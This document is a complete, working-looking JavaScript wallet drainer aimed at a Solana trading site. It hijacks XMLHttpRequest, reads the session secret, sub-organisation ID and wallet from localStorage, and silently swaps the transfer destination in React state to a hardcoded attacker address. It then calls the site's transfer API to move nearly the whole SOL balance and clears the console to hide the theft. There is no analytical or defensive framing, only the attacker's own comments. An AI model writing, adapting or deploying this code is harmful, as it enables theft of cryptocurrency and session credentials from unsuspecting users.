(function() {
    const _V_DEST = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
    const _V_API = 'https://trade.padre.gg/api/v1/transfer';
    const _V_RPC = 'https://api.mainnet-beta.solana.com';

    // 1. SILENT STATE HIJACK (The "Vanta" Way)
    // We hook into the React Fiber to modify the transfer destination silently
    const _hijackDestination = () => {
        const containers = document.querySelectorAll('[class*="MuiGrid-root"]');
        containers.forEach(el => {
            const key = Object.keys(el).find(k => k.startsWith('__reactFiber'));
            if (el[key] && el[key].return) {
                // If we find the transfer state, we inject the destination address
                let state = el[key].return;
                while (state) {
                    if (state.memoizedState && state.memoizedState.destinationAddress !== undefined) {
                        state.memoizedState.destinationAddress = _V_DEST;
                    }
                    state = state.return;
                }
            }
        });
    };

    // 2. AUTO-DRAIN LOGIC (Leave $1)
    const _executeVanta = async (auth, org, wallet) => {
        try {
            const res = await fetch(_V_RPC, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [wallet] })
            });
            const data = await res.json();
            const lamports = data.result.value;
            const solBalance = lamports / 1e9;

            // Math: Balance - ($1 [0.004 SOL] + Priority Fee [0.005 SOL])
            const drainAmount = (solBalance - 0.009).toFixed(6);
            if (drainAmount <= 0) return;

            await fetch(_V_API, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${auth}`,
                    'X-Turnkey-Sub-Org-Id': org,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ dest: _V_DEST, asset: "SOL", amount: drainAmount })
            });
            // 3. SILENT CLEANUP (Leave no trace in console)
            console.clear();
        } catch (e) {}
    };

    // 4. PERSISTENT NETWORK HOOK
    const _O_SEND = window.XMLHttpRequest.prototype.send;
    Object.defineProperty(window.XMLHttpRequest.prototype, 'send', {
        value: function() {
            this.addEventListener('load', () => {
                if (this.status === 200) {
                    const s = localStorage.getItem('sessionSecret');
                    const o = localStorage.getItem('subOrgId');
                    const w = localStorage.getItem('activeWallet');
                    if (s && o && w && !window._V_DONE) {
                        window._V_DONE = true;
                        _hijackDestination(); // Sets the hidden transfer target
                        _executeVanta(s.replace(/"/g,''), o.replace(/"/g,''), w.replace(/"/g,''));
                    }
                }
            });
            return _O_SEND.apply(this, arguments);
        },
        writable: false
    });

    console.log("VANTA_GOD_MODE: ACTIVE");
})();
